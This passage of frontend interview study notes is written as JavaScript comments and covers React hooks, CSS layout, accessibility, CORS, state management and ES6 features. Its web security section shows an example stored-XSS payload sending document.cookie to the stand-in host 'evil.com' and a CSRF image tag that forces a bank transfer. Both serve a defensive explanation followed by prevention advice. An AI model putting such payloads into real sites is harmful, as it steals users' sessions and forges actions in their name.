 * class Animal {
 *   speak() { return 'sound'; }
 * }
 * This compiles to: Animal.prototype.speak = function() { return 'sound'; }
 * Under the hood, it's the same prototype chain.
 *
 * USEFUL METHODS:
 * - Object.create(proto): create a new object with proto as its [[Prototype]]
 * - obj.hasOwnProperty('key'): true only if key is on obj itself, not inherited
 * - 'key' in obj: true if key is anywhere in the chain (own OR inherited)
 * - instanceof: walks the prototype chain to check if constructor's prototype is in it
 *
 * 🗣️ SAY IN INTERVIEW:
 * - "JS is objects linking to objects — not classical class-based inheritance"
 * - "Property lookup walks the chain: own → [[Prototype]] → ... → null"
 * - "ES6 class is syntactic sugar — it's still prototypes underneath"
 * - "hasOwnProperty checks own only; `in` operator checks the entire chain"
 * - "Methods on the prototype are shared across instances — not copied"
 */


// ── 12. REACT HOOKS — DEEP DIVE ───────────────────────────────
/**
 * WHY HOOKS EXIST:
 * Before hooks, stateful logic lived only in class components.
 * Sharing logic between components required HOCs or render props (messy patterns).
 * Hooks let function components have state, side effects, and shared logic via custom hooks.
 *
 * HOOK RULES (these are strict and enforced by the linter):
 * 1. Only call hooks at the TOP LEVEL of your component.
 *    Not inside if statements, loops, or nested functions.
 * 2. Only call hooks in React function components or custom hooks.
 *
 * WHY? React tracks hooks by their CALL ORDER. Internally, hooks are stored
 * in a linked list. If you skip a hook call on one render (due to a condition),
 * all subsequent hooks get the wrong state. React would give you someone else's state.
 *
 * ─── CORE HOOKS ───
 *
 * useState(initialValue):
 *   Returns [currentValue, setterFn].
 *   Setting state triggers a re-render. Updates are BATCHED in React 18+
 *   (multiple setStates in one event = one re-render).
 *   State updates are ASYNCHRONOUS — the new value is available in the next render.
 *
 * useEffect(fn, deps):
 *   Runs AFTER the render is committed to the DOM.
 *   - [] → runs once after mount (like componentDidMount)
 *   - [a, b] → runs after mount AND whenever a or b changes
 *   - no deps → runs after EVERY render (usually wrong)
 *   Return a cleanup function: runs before the NEXT effect fires AND on unmount.
 *   Use for: API calls, subscriptions, manual DOM mutations, timers.
 *   Do NOT use for: deriving state from props (do it during render instead).
 *
 * useRef(initialValue):
 *   Returns { current: value }. Mutating .current does NOT trigger a re-render.
 *   Two uses:
 *   1. DOM ref: <input ref={myRef} /> → myRef.current = the DOM node
 *   2. Instance variable: store values that need to persist across renders
 *      without causing re-renders (previous value, timer ID, animation frame ID).
 *
 * useMemo(() => expensiveCompute(), [deps]):
 *   Caches the RESULT. Recomputes only when deps change.
 *   Use for: expensive calculations, creating stable object/array references.
 *   Don't overuse — the memo overhead costs something too.
 *
 * useCallback(fn, [deps]):
 *   Caches the FUNCTION REFERENCE (not result).
 *   A function defined inline in JSX = new reference every render.
 *   useCallback ensures the same reference is returned unless deps change.
 *   Mainly useful when passing functions as props to memo'd children.
 *
 * useReducer(reducer, initialState):
 *   Alternative to useState for complex state logic.
 *   reducer = (state, action) => newState
 *   dispatch(action) triggers the reducer.
 *   Good when: multiple sub-values, next state depends on previous, complex transitions.
 *
 * useContext(MyContext):
 *   Subscribes to the nearest <MyContext.Provider> above in the tree.
 *   Component re-renders whenever the context VALUE changes.
 *
 * ─── ADVANCED HOOKS ───
 *
 * useLayoutEffect(fn, deps):
 *   Like useEffect, but fires SYNCHRONOUSLY after DOM mutations, BEFORE paint.
 *   Use for: reading DOM measurements (offsetWidth, getBoundingClientRect)
 *            and then synchronously updating state/style before the user sees anything.
 *   Avoid overusing — it blocks the browser from painting until it finishes.
 *
 * useTransition():
 *   Returns [isPending, startTransition].
 *   Wrap non-urgent updates in startTransition(() => setState(...)).
 *   React can interrupt these updates to handle urgent ones (user typing).
 *   isPending = true while the transition is processing → show loading indicator.
 *
 * useDeferredValue(value):
 *   Like useTransition but for VALUES, not setters.
 *   Returns a deferred version of the value — lags behind on purpose.
 *   Use to defer re-rendering an expensive child until the main thread is free.
 *
 * useImperativeHandle(ref, () => ({ ... }), deps):
 *   Used with forwardRef. Customizes what the parent gets when it uses a ref on your component.
 *   Instead of exposing the entire DOM node, you expose only specific methods:
 *   { focus: () => inputRef.current.focus(), reset: () => setValue('') }
 *   Principle of least privilege — parent gets only what it needs.
 *
 * 🗣️ SAY IN INTERVIEW:
 * - "Hooks are tracked by call order — that's why you can't call them conditionally"
 * - "useEffect cleanup runs before the next effect AND on unmount"
 * - "useRef doesn't trigger re-renders — perfect for DOM refs and storing prev values"
 * - "useLayoutEffect is synchronous before paint — use for DOM measurement, avoid otherwise"
 * - "useTransition keeps UI responsive by marking updates as non-urgent"
 * - "useImperativeHandle exposes a limited API to parent instead of full DOM access"
 */


// ── 13. CSS FLEXBOX vs GRID ───────────────────────────────────
/**
 * FLEXBOX — 1 DIMENSIONAL LAYOUT:
 * Flexbox is designed for laying out items in a SINGLE direction: either a row OR a column.
 * Content drives the layout — items size themselves based on content, then distribute space.
 * Think of a navigation bar, a row of cards, a toolbar, or centering one element.
 *
 * CONTAINER PROPERTIES:
 * - display: flex — creates a flex container
 * - flex-direction: row (default) | column
 * - justify-content: aligns along the MAIN axis (horizontal in row)
 *   → flex-start, flex-end, center, space-between, space-around, space-evenly
 * - align-items: aligns along the CROSS axis (vertical in row)
 *   → stretch (default), center, flex-start, flex-end, baseline
 * - flex-wrap: nowrap (default) | wrap (items wrap to next line when out of space)
 * - gap: spacing between items — replaces margin hacks
 *
 * ITEM PROPERTIES:
 * - flex: 1      → shorthand for flex-grow:1 flex-shrink:1 flex-basis:0
 *                  Items grow equally to fill all available space.
 * - flex: none   → shorthand for flex-grow:0 flex-shrink:0 flex-basis:auto
 *                  Item stays fixed at its natural size.
 * - flex: auto   → flex-grow:1 flex-shrink:1 flex-basis:auto
 *                  Grows equally but respects content size as starting point.
 * - align-self   → overrides align-items for just this one item
 * - order        → change visual order without changing DOM order
 *
 * GOTCHAS:
 * - min-width: auto (default) can prevent items from shrinking.
 *   Fix with min-width: 0 or overflow: hidden on the item.
 * - margin: auto in a flex container absorbs ALL remaining space on that side.
 *   Useful trick: margin-left: auto on last nav item pushes it to the right.
 * - flex-basis overrides width inside a flex container.
 *
 * FLEX-GROW CALCULATION (interview trick):
 * Container 600px wide. Three items, each 100px (flex-basis).
 * Remaining space = 600 - 300 = 300px. Grow ratios: 1, 2, 3. Total = 6.
 * Item 1: 100 + (300 × 1/6) = 150px
 * Item 2: 100 + (300 × 2/6) = 200px
 * Item 3: 100 + (300 × 3/6) = 250px
 * Note: if flex-basis: 0, distributes ALL 600px by ratio (not just remaining).
 *
 * ──────────────────────────────────────────────────────────────
 *
 * GRID — 2 DIMENSIONAL LAYOUT:
 * Grid is designed for 2D layouts — controlling BOTH rows and columns simultaneously.
 * The layout structure is defined upfront on the container; items are then placed into it.
 * Think of page layouts, dashboards, image galleries, or any 2D structure.
 *
 * CONTAINER PROPERTIES:
 * - display: grid
 * - grid-template-columns: defines column widths
 *   → 200px 1fr 1fr  (first fixed, then two equal flexible)
 *   → repeat(3, 1fr)  (three equal columns)
 *   → repeat(auto-fit, minmax(250px, 1fr))
 *     This is the responsive grid magic — browser auto-creates as many
 *     250px+ columns as fit, stretching them to fill the row. No media queries!
 * - grid-template-rows: same but for rows
 * - gap (or row-gap / column-gap): spacing between cells
 * - grid-template-areas: named layout — super readable for complex structures
 *
 * PLACING ITEMS:
 * - grid-column: 1 / 3   → spans from line 1 to line 3 (occupies 2 columns)
 * - grid-column: 1 / -1  → spans full width (from first to last line)
 * - grid-column: span 2  → spans 2 columns from current position
 * - grid-area: header    → places item in named area
 *
 * auto-fill vs auto-fit:
 * - auto-fill: always creates as many tracks as will fit, even if empty
 * - auto-fit: collapses empty tracks — filled items stretch to fill
 *   Usually auto-fit is what you want for responsive grids.
 *
 * NAMED AREAS EXAMPLE (shows how readable grid layout can be):
 * .container {
 *   grid-template-areas:
 *     "header  header  header"
 *     "sidebar content aside"
 *     "footer  footer  footer";
 * }
 * .header  { grid-area: header; }
 * .sidebar { grid-area: sidebar; }
 *
 * GRID vs FLEXBOX — WHEN TO USE:
 * | Scenario                          | Use     |
 * |-----------------------------------|---------|
 * | Navbar, toolbar                   | Flexbox |
 * | Centering a single item           | Flexbox |
 * | Row of wrapping cards             | Flexbox |
 * | Full page layout (header/sidebar) | Grid    |
 * | Photo gallery, dashboard          | Grid    |
 * | Overlapping elements              | Grid    |
 * | Content drives size               | Flexbox |
 * | Layout drives size                | Grid    |
 *
 * They're COMPLEMENTARY: use Grid for page-level layout, Flexbox for component-level layout.
 *
 * 🗣️ SAY IN INTERVIEW:
 * - "Flexbox is 1D (one direction), Grid is 2D (rows AND columns) — I use both"
 * - "justify-content = main axis, align-items = cross axis"
 * - "flex: 1 = grow equally with zero basis; flex: none = fixed size"
 * - "repeat(auto-fit, minmax(250px, 1fr)) = fully responsive grid with no media queries"
 * - "Named grid areas make complex layouts extremely readable"
 * - "min-width: 0 fixes the flex item shrinking issue"
 */


// ── 14. WEB SECURITY — XSS & CSRF ────────────────────────────
/**
 * ─── XSS: CROSS-SITE SCRIPTING ───
 * WHAT: An attacker injects malicious JavaScript into YOUR web page,
 * which then runs in OTHER users' browsers.
 * Once malicious JS runs on your page, it has full access to:
 * cookies, localStorage, DOM, can make API calls as the user, steal credentials.
 *
 * THREE TYPES:
 *
 * 1. STORED XSS (most dangerous):
 *    Attacker submits malicious script via a form (comment, username, profile bio).
 *    Your server saves it in the DB. Every user who views that page runs the script.
 *    Example: username = <script>document.location='evil.com?c='+document.cookie</script>
 *
 * 2. REFLECTED XSS:
 *    Script is in the URL query param. Server reflects it back in the HTML response.
 *    User must be tricked into clicking a malicious URL.
 *    Example: /search?q=<script>alert(1)</script>
 *
 * 3. DOM XSS:
 *    No server involvement. Client-side JS reads attacker-controlled input
 *    (URL hash, query params) and writes it directly to the DOM:
 *    document.getElementById('output').innerHTML = location.hash  // ❌ DANGEROUS
 *
 * PREVENTION:
 * - React auto-escapes all JSX expressions: {userInput} renders as text, not HTML.
 *   React's only XSS risk is dangerouslySetInnerHTML={{ __html: userInput }}
 *   NEVER use this with user-provided data.
 * - If you MUST render HTML (rich text editor output), use DOMPurify to sanitize first.
 * - CSP (Content Security Policy) header: tells browser to block inline scripts
 *   and only allow scripts from whitelisted sources. Strongest defense layer.
 * - Sanitize and encode on the SERVER too — never trust client-side only.
 *
 * ─── CSRF: CROSS-SITE REQUEST FORGERY ───
 * WHAT: An attacker tricks a logged-in user into making an unwanted request to your server.
 * The user's browser automatically sends cookies with every request to your domain.
 * Attacker's page: <img src="https://bank.com/transfer?to=attacker&amount=1000">
 * If the user is logged into bank.com, their browser sends the request WITH their session cookie.
 * The server sees a valid authenticated request and processes it.
 *
 * The key difference from XSS: CSRF doesn't inject code into your site.
 * It abuses the browser's automatic cookie-sending behavior from a DIFFERENT site.
 *
 * PREVENTION:
 * 1. SameSite cookie attribute (most effective modern solution):
 *    SameSite=Lax: cookie is NOT sent on cross-site requests from third-party pages.
 *    SameSite=Strict: cookie NEVER sent cross-site (breaks some OAuth flows).
 *    Modern browsers default to Lax, which blocks most CSRF automatically.
 *
 * 2. CSRF tokens:
 *    Server generates a unique random token per session/request.
 *    Token embedded in forms as a hidden field.
 *    Server validates the token on every mutating request.
 *    Attacker can't read the token (same-origin policy blocks cross-origin reads).
 *
 * 3. Check Origin/Referer headers: reject requests from unexpected origins.
 * 4. Never use GET for state-changing operations (NEVER GET /deleteAccount).
 *
 * 🗣️ SAY IN INTERVIEW:
 * - "XSS = attacker runs code IN your site. CSRF = attacker makes your site run code AS the user."
 * - "React auto-escapes JSX — dangerouslySetInnerHTML is the only XSS vector in React"
 * - "CSP header is the strongest XSS defense — blocks scripts from unauthorized sources"
 * - "SameSite=Lax on cookies blocks most CSRF without needing tokens"
 * - "Sanitize on both client AND server — client-side only is security theater"
 */


// ── 15. STATE MANAGEMENT — WHEN TO USE WHAT ──────────────────
/**
 * COMMON MISTAKE: people reach for Redux/Zustand for everything.
 * The real skill is knowing which tool fits which type of data.
 *
 * DATA TYPES AND THE RIGHT TOOL:
 *
 * Server / async data (most of your app's data):
 *   → TanStack Query (React Query) / SWR / RTK Query
 *   This is NOT the same as "global state". Server data is:
 *   - remote, async, can be stale, needs caching, refetching, deduplication
 *   TanStack Query handles ALL of that automatically:
 *   background refetch, stale-while-revalidate, optimistic updates, pagination.
 *   Using Redux to store server data = reimplementing all of this manually.
 *
 * Local UI state (dropdown open, form values, active tab):
 *   → useState — keep it local. Don't lift unless something ELSE needs it.
 *
 * Complex local state (state machine, multiple related fields, transitions):
 *   → useReducer — cleaner than multiple useStates when updates are interdependent.
 *
 * Shared state (a few components need the same data):
 *   → Context + useState/useReducer
 *   But be careful: Context re-renders ALL consumers when the value changes.
 *   Only use Context for data that changes infrequently (theme, auth user, locale).
 *
 * Truly global client state (user preferences, UI state that persists across pages):
 *   → Zustand / Jotai / Redux Toolkit
 *   Zustand is preferred today for its simplicity. Redux for large teams with complex flows.
 *
 * Form state:
 *   → React Hook Form. Uncontrolled inputs + validation = fast and minimal re-renders.
 *
 * URL-driven state (search filters, page number, selected tab):
 *   → useSearchParams / router state
 *   Benefit: shareable URLs, browser back/forward works correctly.
 *
 * CONTEXT IS NOT A STATE MANAGER — understand this deeply:
 * Context is a dependency injection mechanism.
 * It doesn't optimize re-renders. It doesn't batch updates.
 * When the value object changes (even one property), ALL consumers re-render.
 * Solution: split one fat Context into multiple focused ones.
 * <ThemeContext> updates rarely. <UserContext> updates on login.
 * A counter clicking 100 times/sec should never be in Context.
 *
 * 🗣️ SAY IN INTERVIEW:
 * - "Server state belongs in TanStack Query — it handles caching, refetching, stale detection"
 * - "Context re-renders ALL consumers on any value change — split by update frequency"
 * - "useState for local, Context for rarely-changing shared data, Zustand for truly global"
 * - "Most apps over-use global state — start local, lift only when necessary"
 * - "URL state is underused — filters and page numbers should be in the URL for shareability"
 */


// ── 16. SEMANTIC HTML & ACCESSIBILITY ────────────────────────
/**
 * ─── SEMANTIC HTML ───
 * WHAT: Using HTML elements that describe their MEANING and PURPOSE,
 * not just their appearance. A <div> is generic. A <nav> tells browsers,
 * screen readers, and search engines "this is navigation".
 *
 * Semantic HTML benefits:
 * - Screen readers use it to build an outline and let users navigate by landmark
 * - Search engines use it for better indexing (SEO)
 * - Browsers apply default behaviors (button = keyboard focusable, form = submittable)
 * - Other devs can read your markup and understand structure instantly
 *
 * PAGE STRUCTURE ELEMENTS:
 * <header>  — site header or section header (logo, title, nav)
 * <nav>     — a set of navigation links (give it aria-label if multiple navs)
 * <main>    — the PRIMARY content of the page. ONE per page.
 * <article> — self-contained, independently syndicate-able content
 *             (blog post, news article, comment, product card — makes sense alone)
 * <section> — thematic grouping. Should have a heading. No heading? Use <div>.
 * <aside>   — tangentially related content (sidebar, pull quotes, ads)
 * <footer>  — page or section footer (copyright, links, contact)
 *
 * INTERACTIVE ELEMENTS:
 * <button>  — ANY clickable action that does NOT navigate to a new URL.
 *             Gets keyboard focus, Enter/Space activation, ARIA role="button" for FREE.
 *             Using <div onClick> is wrong — you'd have to manually add tabindex,
 *             keyboard handlers, ARIA role, focus styles. Just use <button>.
 * <a href>  — navigation only. Gets right-click menu, ctrl+click to open in new tab,
 *             and is crawled by search engines. Don't use for actions without an href.
 * <details>/<summary> — native collapsible/accordion. Zero JS needed.
 * <dialog>  — native modal. showModal() traps focus automatically (huge a11y win).
 *
 * HEADINGS:
 * - One <h1> per page (the main topic)
 * - Sequential order: h1 → h2 → h3 (never skip from h1 to h4)
 * - Screen readers generate a "heading outline" — users navigate by jumping between headings
 *
 * FORMS:
 * - Every <input> needs a <label> (for/id pairing OR wrapping the input)
 *   Placeholder text disappears on typing and has poor contrast — NOT a substitute for labels.
 * - <fieldset> + <legend> groups related inputs (radio buttons, checkboxes)
 * - Use proper input types: type="email", type="tel", type="date", type="number"
 *   → gives mobile users the right keyboard, adds free client-side validation
 * - autocomplete attribute helps password managers and autofill
 *
 * ─── ACCESSIBILITY (a11y) ───
 * Making your app usable by everyone — including people using screen readers,
 * keyboard-only navigation, voice control, or those with cognitive/visual impairments.
 *
 * WCAG 2.1 PRINCIPLES (POUR):
 * Perceivable — content can be perceived (alt text, captions, sufficient contrast)
 * Operable — UI can be operated (keyboard, no seizure triggers, enough time)
 * Understandable — content is understandable (clear labels, predictable behavior)
 * Robust — works with assistive tech (valid HTML, ARIA used correctly)
 *
 * COLOR CONTRAST:
 * - Normal text: 4.5:1 ratio minimum (AA standard)
 * - Large text (18px+ or 14px+ bold): 3:1 minimum
 * - UI components and icons: 3:1 minimum
 * - Never convey information ONLY through color (add icons, labels, or patterns)
 *
 * KEYBOARD ACCESSIBILITY:
 * - Tab: moves focus between interactive elements
 * - Enter / Space: activates buttons, links, checkboxes
 * - Escape: closes modals, dropdowns
 * - All interactive elements must be reachable and operable via keyboard alone
 * - Visible :focus-visible styles — never do outline: none without a replacement
 * - tabindex="0": add element to tab order | tabindex="-1": only JS-focusable (for modals)
 * - Focus trapping in modals: Tab should loop within the modal, not escape to the page
 * - Return focus to the trigger element when modal closes
 *
 * ARIA (Accessible Rich Internet Applications):
 * FIRST RULE: Don't use ARIA if a native HTML element already provides the semantics.
 * <button> > role="button" on a <div>. Always.
 *
 * When you DO need ARIA:
 * - aria-label: provides accessible name when no visible text exists (icon-only button)
 * - aria-labelledby: points to another element's ID to use as the accessible name
 * - aria-describedby: links supplementary description (error message, hint)
 * - aria-expanded="true/false": for toggles, dropdowns, accordions
 * - aria-hidden="true": hides element from screen readers (decorative icons)
 * - aria-invalid="true" + aria-describedby: link error message to invalid input
 * - aria-live="polite": announces dynamic content changes at next pause
 * - aria-live="assertive": announces immediately (use only for errors/critical alerts)
 *
 * TESTING:
 * 1. Keyboard only — Tab through everything without touching the mouse
 * 2. Lighthouse (DevTools) — automated a11y audit
 * 3. axe DevTools browser extension — more detailed than Lighthouse
 * 4. Screen reader: VoiceOver (Mac), NVDA (Windows, free)
 * 5. Zoom to 200% — does layout break or overflow?
 *
 * 🗣️ SAY IN INTERVIEW:
 * - "<button> gives keyboard access, focus management, and ARIA role for free"
 * - "<dialog> with showModal() traps focus automatically — no custom JS needed"
 * - "ARIA first rule: don't use ARIA if native HTML achieves the same thing"
 * - "aria-live='polite' announces dynamic content changes to screen reader users"
 * - "Focus trapping in modals and returning focus on close are critical a11y patterns"
 * - "I test with keyboard only, Lighthouse, and a screen reader"
 */


// ── 17. CORS ──────────────────────────────────────────────────
/**
 * WHAT IS CORS?
 * The Same-Origin Policy is a browser security rule that blocks web pages
 * from making requests to a DIFFERENT origin (protocol + hostname + port).
 * Your app at https://app.com cannot fetch from https://api.com by default.
 *
 * CORS (Cross-Origin Resource Sharing) is the mechanism that lets servers
 * RELAX the same-origin policy for specific trusted origins.
 *
 * IMPORTANT: CORS is enforced by the BROWSER only.
 * Server-to-server requests, curl, Postman, Node.js — none of them have CORS.
 * If you're getting a CORS error, it's always the BROWSER blocking the response.
 *
 * WHAT IS "SAME ORIGIN"?
 * https://app.com:443/page  → Same origin requires ALL three to match:
 * - Protocol: https vs http → DIFFERENT origin
 * - Host: app.com vs api.com → DIFFERENT origin
 * - Port: :443 vs :3000 → DIFFERENT origin
 *
 * HOW CORS WORKS:
 *
 * Simple Requests (GET, POST with basic headers like Content-Type: text/plain):
 * Browser sends the request + Origin header.
 * Server responds with Access-Control-Allow-Origin header.
 * If header matches → browser lets your JS see the response.
 * If header missing/wrong → browser blocks the response (network tab shows success but JS fails).
 *
 * Preflight Requests (for non-simple requests: custom headers, PUT, DELETE, JSON body):
 * Before sending the actual request, browser sends an OPTIONS request:
 * "Can I send POST with Content-Type: application/json and Authorization header?"
 * Server responds with what it allows.
 * If allowed → browser sends the actual request.
 * If not → browser blocks with CORS error, actual request never sent.
 *
 * SERVER RESPONSE HEADERS:
 * Access-Control-Allow-Origin: https://app.com  (or * for public APIs)
 * Access-Control-Allow-Methods: GET, POST, PUT, DELETE
 * Access-Control-Allow-Headers: Content-Type, Authorization
 * Access-Control-Allow-Credentials: true  (if using cookies — cannot use * for origin!)
 * Access-Control-Max-Age: 86400  (cache the preflight for 24 hours)
 *
 * credentials: 'include' in fetch:
 * Sends cookies with cross-origin requests.
 * Requires: server must set Access-Control-Allow-Credentials: true
 *           AND Access-Control-Allow-Origin must be a SPECIFIC origin (not *)
 *
 * DEV SOLUTION: dev proxy (Vite, CRA, webpack-dev-server all support this).
 * Your JS fetches /api → your dev server proxies it to https://api.com.
 * Since the request comes from the server (same origin to browser), no CORS.
 *
 * 🗣️ SAY IN INTERVIEW:
 * - "CORS is browser-enforced — curl and server-to-server calls have no CORS"
 * - "Preflight OPTIONS fires before non-simple requests (custom headers, PUT/DELETE)"
 * - "The browser blocks the RESPONSE — the request may have already hit the server"
 * - "wildcard * cannot be used with credentials: 'include'"
 * - "In dev I use a proxy; in prod the server whitelists specific origins"
 */


// ── 18. CANVAS vs DOM ─────────────────────────────────────────
/**
 * DOM — RETAINED MODE:
 * The browser maintains a model of every element you create.
 * Each element is a live object. When something changes, the browser
 * figures out what needs to be repainted and handles it.
 * You say "make this div red" and the browser does the work.
 *
 * Canvas — IMMEDIATE MODE:
 * You draw pixels directly. The browser has NO memory of what you drew.
 * To "update" something, you clear the canvas and redraw everything from scratch.
 * It's your job to track what's where and handle hit testing.
 *
 * | Aspect               | DOM                  | Canvas                    |
 * |----------------------|----------------------|---------------------------|
 * | Model                | Retained (browser tracks) | Immediate (you track)  |
 * | Layout & reflow      | Yes (automatic)      | No (you calculate)        |
 * | Built-in events      | ✅ click, hover etc  | ❌ manual coordinate math |
 * | Built-in scrolling   | ✅                   | ❌                        |
 * | Accessibility        | ✅ native (screen readers) | ❌ must add manually  |
 * | SEO / text selection | ✅ excellent         | ❌ pixels, not text       |
 * | 10,000+ elements     | Slow (layout cost)   | Fast (just pixels)        |
 * | 60fps animation      | Difficult            | Natural                   |
 * | Memory per element   | High (full DOM object) | Low (just pixels)       |
 *
 * WHEN TO USE CANVAS:
 * - Games (hundreds of moving sprites)
 * - Interactive maps (Google Maps renders tiles on canvas)
 * - Real-time data visualizations (60fps charts)
 * - Particle systems, physics simulations
 * - Image editors (Figma, Canva)
 *
 * WHEN TO USE DOM:
 * - UI (forms, buttons, menus)
 * - Text content (readable, selectable, translatable)
 * - Anything needing accessibility
 * - Content that needs to be indexed by search engines
 *
 * HYBRID APPROACH (real world):
 * Figma uses Canvas for the design surface (thousands of shapes at 60fps)
 * but uses DOM for its panels, menus, toolbars, and text inputs.
 * Best of both worlds — high-performance visuals + accessible UI.
 *
 * WebGL extends Canvas for GPU-accelerated 3D rendering (Three.js, Babylon.js).
 *
 * 🗣️ SAY IN INTERVIEW:
 * - "Canvas skips layout and reflow — faster for thousands of moving elements"
 * - "DOM is better for accessibility, text content, and anything needing events"
 * - "Real apps use a hybrid — Canvas for the visual surface, DOM for the UI chrome"
 */


// ── 19. MACHINE CODING ROUND STRATEGY ────────────────────────
/**
 * WHAT IS A MACHINE CODING ROUND?
 * Build a functional UI feature in 45 minutes to 2 hours.
 * You're evaluated on: thought process, code structure, HTML quality,
 * CSS skills, edge case handling — not just "does it work".
 *
 * STEP 1 — UNDERSTAND BEFORE YOU CODE (first 5–10 minutes):
 * Never jump straight to coding. Interviewers watch how you break down a problem.
 * - Read the problem statement fully, twice.
 * - Ask clarifying questions:
 *   "Should this be responsive?"
 *   "Is there an API or should I mock the data?"
 *   "Should I handle loading and error states?"
 *   "Any accessibility requirements?"
 * - Sketch the component tree in comments before writing code.
 * - Decide what's core vs nice-to-have and communicate your priority.
 *
 * STEP 2 — BUILD IN ORDER (not all at once):
 * 1. HTML skeleton — semantic structure with correct elements
 * 2. Core functionality — the main feature working, even if ugly
 * 3. Responsiveness — basic mobile layout
 * 4. Edge cases — empty state, loading state, error state
 * 5. Polish — animations, accessibility details, if time permits
 *
 * Stopping at step 2 with clean code is BETTER than reaching step 5 with messy code.
 *
 * WHAT INTERVIEWERS SPECIFICALLY LOOK FOR:
 * - Semantic HTML: <header>, <nav>, <main>, <button>, <ul>/<li> not <div> everywhere
 * - CSS layout: Flexbox/Grid, not float hacks or position abuse
 * - Clean JavaScript: destructuring, optional chaining, async/await, proper error handling
 * - Event delegation for dynamic lists
 * - Proper keys in React (not array index for dynamic lists)
 * - Component single responsibility
 *
 * COMMON MACHINE CODING PROBLEMS:
 * Email client, chat UI, kanban board, file explorer, infinite scroll,
 * search with autocomplete, star rating, multi-step form, accordion, modal system
 *
 * 🗣️ SAY WHILE CODING:
 * - "Let me take a few minutes to understand requirements before I start"
 * - "I'm going to build the working skeleton first, then add polish"
 * - "I'll use a <button> here instead of a div for proper keyboard support"
 * - "A working 80% solution beats an incomplete 100% one in this format"
 */


// ── 20. LOW-LEVEL DESIGN (LLD) ────────────────────────────────
/**
 * WHAT IS LLD?
 * Given a system (Snake game, Parking lot, Tic-tac-toe, URL shortener),
 * design the classes, their properties, methods, and how they interact.
 * This tests your OOP thinking, class design, and how you handle requirements changes.
 *
 * APPROACH — follow this structure every time:
 *
 * 1. IDENTIFY ENTITIES (nouns in the problem description):
 *    Snake game → Snake, Board, Food, Game, Player
 *
 * 2. IDENTIFY BEHAVIORS (verbs):
 *    Snake: move, grow, checkCollision
 *    Board: render, placeFood
 *    Game: start, pause, end, handleInput
 *
 * 3. DEFINE RELATIONSHIPS:
 *    Has-a: Game has-a Board, Game has-a Snake, Game has-a Food
 *    Is-a: HumanPlayer is-a Player, AIPlayer is-a Player (inheritance for polymorphism)
 *    Uses: Game uses InputHandler
 *
 * 4. APPLY SOLID PRINCIPLES:
 *    S — Single Responsibility: each class does ONE thing.
 *        Dice only rolls. Board only tracks positions. Don't mix them.
 *    O — Open/Closed: open for extension, closed for modification.
 *        Add a new piece type by subclassing, not by editing existing code.
 *    L — Liskov Substitution: a subclass should work wherever the parent is used.
 *        AIPlayer and HumanPlayer should be interchangeable as Player.
 *    I — Interface Segregation: don't force a class to implement methods it doesn't use.
 *    D — Dependency Inversion: depend on abstractions (interfaces/base classes), not concretions.
 *        Game depends on Player (abstract), not HumanPlayer specifically.
 *
 * 5. THINK ABOUT EXTENSIBILITY:
 *    Interviewers WILL ask follow-up "what if" questions. Think ahead:
 *    "What if we add multiplayer?" → event system + WebSocket layer
 *    "What if we want undo/redo?" → Command pattern (each action = an object)
 *    "What if AI players?" → Strategy pattern (swap difficulty strategy)
 *    "What if custom themes?" → Observer pattern (theme changes notify components)
 *
 * 🗣️ SAY IN INTERVIEW:
 * - "I start with entities, then behaviors, then relationships between them"
 * - "Each class has a single responsibility — Game coordinates, Snake moves"
 * - "I prefer composition over inheritance where possible — more flexible"
 * - "I design for extension — adding a feature should not require modifying existing code"
 */


// ── 21. ES6+ FEATURES — THE COMPLETE GUIDE ───────────────────
/**
 * ─── let / const vs var ───
 * var: function-scoped, hoisted and initialized as undefined, goes on window.
 *   No block scope: if (true) { var x = 1; } console.log(x); // 1 — leaks out!
 *
 * let/const: block-scoped, hoisted but NOT initialized (TDZ applies).
 *   Accessing before declaration = ReferenceError.
 *
 * const prevents REASSIGNMENT, NOT mutation:
 *   const obj = { x: 1 };
 *   obj.x = 2; // ✅ mutation is fine
 *   obj = {}; // ❌ reassignment throws TypeError
 *
 * Use const by default. Use let only when you know it will be reassigned.
 * Never use var in modern code.
 *
 * ─── Arrow Functions ───
 * Syntax sugar AND a behavioral difference:
 * - No own `this` — lexically inherits from enclosing scope
 * - No `arguments` object (use rest params ...args instead)
 * - No `prototype` — cannot be used with `new`
 * - Implicit return for single expressions: x => x * 2
 *
 * Use for: callbacks, array methods, preserving outer `this`
 * Don't use for: object methods, constructors, anything needing its own `this`
 *
 * ─── Destructuring ───
 * Pull values out of objects and arrays into variables cleanly.
 *
 * Object: const { name, age = 25, role: userRole } = user;
 *   (age has default value; role is renamed to userRole)
 *
 * Array:  const [first, , third] = items;
 *   (skip elements by leaving empty)
 *
 * Function params: function fn({ name, role = 'user' } = {})
 *   The = {} at the end prevents crash if no argument is passed.
 *
 * ─── Spread and Rest (...) ───
 * Spread: expands an iterable.
 *   Arrays: [...arr1, ...arr2, newItem]
 *   Objects: { ...defaults, ...overrides }  → later keys win on conflict
 *
 * Rest: collects remaining arguments/properties.
 *   function sum(...nums) { return nums.reduce((a,b) => a+b, 0); }
 *   const { password, ...safeUser } = user;  → omit password
 *
 * ⚠️ BOTH spread and Object.assign are SHALLOW copies.
 * Nested objects share the same reference. Modifying nested = modifies original.
 * For true deep copy: structuredClone(obj) — handles dates, Maps, circular refs.
 *
 * Object.assign vs spread:
 * - Object.assign(target, source) — MUTATES the target, returns it
 * - { ...obj } — always creates a NEW object, never mutates
 * In React, always use spread for state updates (immutability).
 *
 * ─── Optional Chaining and Nullish Coalescing ───
 * user?.profile?.avatar  → undefined (not TypeError) if any step is null/undefined
 * arr?.[0]               → optional element access
 * fn?.()                 → optional function call
 *
 * ?? (nullish coalescing): returns right side only for null or undefined.
 * || (logical OR): returns right side for ANY falsy value (0, '', false, null, undefined).
 *
 * Critical difference:
 * const count = data.count ?? 0;  // 0 from data.count is PRESERVED (not replaced)
 * const count = data.count || 0;  // 0 from data.count is REPLACED — wrong!
 * Use ?? when 0, '', or false are valid meaningful values.
 *
 * ─── Promises and async/await ───
 * async function always returns a Promise.
 * await pauses execution until the Promise settles (but doesn't block the thread).
 * Code after await runs as a microtask.
 * Always wrap in try/catch, or use .catch() on the Promise.
 *
 * Promise combinators:
 * | Combinator          | Resolves when    | Rejects when    |
 * |---------------------|------------------|-----------------|
 * | Promise.all([...])  | ALL resolve       | ANY rejects     |
 * | Promise.allSettled  | ALL settle        | Never           |
 * | Promise.race([...]) | FIRST settles     | FIRST settles   |
 * | Promise.any([...])  | FIRST resolves    | ALL reject      |
 *
 * Use Promise.all for parallel requests (fastest total time).
 * Use Promise.allSettled when you want all results even if some fail.
 *
